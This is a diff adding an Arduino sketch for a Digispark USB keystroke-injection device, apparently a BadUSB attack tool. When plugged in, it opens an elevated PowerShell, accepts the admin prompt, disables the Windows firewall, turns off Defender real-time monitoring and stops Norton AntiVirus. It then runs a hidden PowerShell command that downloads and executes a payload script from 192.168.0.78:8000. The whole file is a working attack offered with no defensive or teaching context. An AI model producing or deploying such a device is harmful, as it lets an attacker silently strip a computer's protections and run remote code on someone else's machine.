@@ -1,0 +1,44 @@
+#include <DigiKeyboard.h>
+#include "DigiKeyboard.h"
+
+void setup() {
+ pinMode(1, OUTPUT); //LED on Model A 
+}
+
+void loop() {
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.print("Stop-Service -Name Norton AntiVirus");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.print("powershell -w hidden \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.78:8000/payload.ps1')\"");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  digitalWrite(1, HIGH); //turn on led when program finishes
+  DigiKeyboard.delay(90000);
+  digitalWrite(1, LOW); 
+  DigiKeyboard.delay(5000);
+
+  for (;;) {
+  }
+}
